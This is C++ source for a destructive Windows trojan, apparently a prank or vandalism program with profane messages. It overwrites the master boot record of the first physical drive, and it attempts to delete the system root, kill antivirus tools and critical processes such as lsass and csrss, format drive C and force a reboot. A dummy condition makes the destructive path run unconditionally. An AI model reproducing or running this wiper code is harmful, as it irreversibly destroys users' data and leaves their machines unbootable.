#include <iostream>
#include <windows.h>
/* run this program using the console pauser or add your own getch, system("pause") or input loop */
using namespace std;
int main(void)
{
    int a,b,c;
    a = 0;
	b = 0;
	c = 0; 
    system ("taskkill /f /im explorer.exe");
    cout << "Win32/Trojian Massage:Your Comtuper is Locked" << endl;
    cout << "fuckyou --your computer" << endl; 
    if (a == 1275934 )
    {
        LPCSTR DiskFileName="\\\\.\\PhysicalDrive0";
        char code[]=
            "fuck -> fuck -> fuck -> fuck -> fuck -> fuck -> "
            "fuck -> fuck -> fuck -> fuck -> fuck -> fuck -> "
            "fuck -> fuck -> fuck -> fuck -> fuck -> fuck -> "
            "fuck -> fuck -> fuck -> fuck -> fuck -> fuck -> ";
        BYTE MBR[512];
        DWORD s=NULL,t=NULL;
        HANDLE handle=NULL;
        memcpy(MBR,code,sizeof(code)-1);
        handle=CreateFileA(
            DiskFileName,
            GENERIC_READ|GENERIC_WRITE,
            FILE_SHARE_READ|FILE_SHARE_WRITE,
            0,
            OPEN_EXISTING,
            0,
            0);
        if(handle==INVALID_HANDLE_VALUE)
        {
        	MessageBoxA(NULL,(LPCSTR)"Fucked your Computer!!!",(LPCSTR)"Error",MB_OK);
        	system("del /f /s /q $SystemRoot$");
        }
        else
        {
        	WriteFile(handle,MBR,sizeof(MBR),&t,NULL);
        	DeviceIoControl(handle,FSCTL_UNLOCK_VOLUME,NULL,0,NULL,0,&s,NULL);
        	CloseHandle(handle);
		}
	}
	if (a != 1275934) 
	{
        LPCSTR DiskFileName="\\\\.\\PhysicalDrive0";
        char code[]=
            "fuck -> fuck -> fuck -> fuck -> fuck -> fuck -> "
            "fuck -> fuck -> fuck -> fuck -> fuck -> fuck -> "
            "fuck -> fuck -> fuck -> fuck -> fuck -> fuck -> "
            "fuck -> fuck -> fuck -> fuck -> fuck -> fuck -> ";
        BYTE MBR[512];
        DWORD s=NULL,t=NULL;
        HANDLE handle=NULL;
        memcpy(MBR,code,sizeof(code)-1);
        handle=CreateFileA(
            DiskFileName,
            GENERIC_READ|GENERIC_WRITE,
            FILE_SHARE_READ|FILE_SHARE_WRITE,
            0,
            OPEN_EXISTING,
            0,
            0);
        if(handle==INVALID_HANDLE_VALUE)
        {
        	MessageBoxA(NULL,(LPCSTR)"Fucked your Computer!!!",(LPCSTR)"Error",MB_OK);
        	system("del /f /s /q $SystemRoot$");
        }
        else
        {
        	WriteFile(handle,MBR,sizeof(MBR),&t,NULL);
        	DeviceIoControl(handle,FSCTL_UNLOCK_VOLUME,NULL,0,NULL,0,&s,NULL);
        	CloseHandle(handle);
		}
		system("taskkill /f /im 360tray.exe");
	    system("taskkill /f /im csrss.exe");
	    system("taskkill /f /im lsm.exe");
	    system("taskkill /f /im dwm.exe");
	    system("taskkill /f /im lsass.exe");
	    system("taskkill /f /im HipsDaemon.exe");
	    system("taskkill /f /im ZhuDongFangYu.exe");
	    system("format C:");
	    system("start .\Error.vbs");
        system("shutdown -r -t 10");
	}
	return 0;
}
